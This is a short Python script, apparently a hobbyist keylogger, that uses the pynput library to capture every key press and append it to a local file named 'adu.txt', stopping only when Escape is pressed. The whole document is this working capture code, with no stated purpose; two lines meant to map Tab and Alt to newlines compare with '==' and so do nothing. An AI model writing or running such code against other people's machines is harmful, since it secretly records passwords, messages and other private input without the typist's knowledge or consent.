from pynput.keyboard import Listener



def anoymous(key) :
    key=str(key)
    key=key.replace("'","")
    if key == "Key.esc" : 
        raise SystemExit(0) 
    if key == "Key.tab" :
        key == "\n"
    if key == "Key.alt_l" :
        key == "\n"  

    with open( "adu.txt" ,"a") as file :
        file.write(key) 
with Listener(on_press=anoymous) as listener :
    listener.join()

